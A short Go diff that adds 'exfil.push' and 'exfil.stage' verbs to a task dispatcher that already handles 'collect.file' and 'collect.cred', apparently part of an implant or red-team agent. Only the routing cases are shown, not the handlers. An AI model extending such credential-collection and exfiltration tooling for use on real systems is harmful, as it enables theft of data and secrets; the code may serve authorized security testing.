@@ -108,6 +108,10 @@ func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.Ta
 		return r.collectFile(ctx, arguments)
 	case "collect.cred":
 		return r.collectCred(ctx, arguments)
+	case "exfil.push":
+		return r.exfilPush(ctx, arguments)
+	case "exfil.stage":
+		return r.exfilStage(ctx, arguments)
 	default:
 		r.log.Printf("unknown verb: %s", verb)
 		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
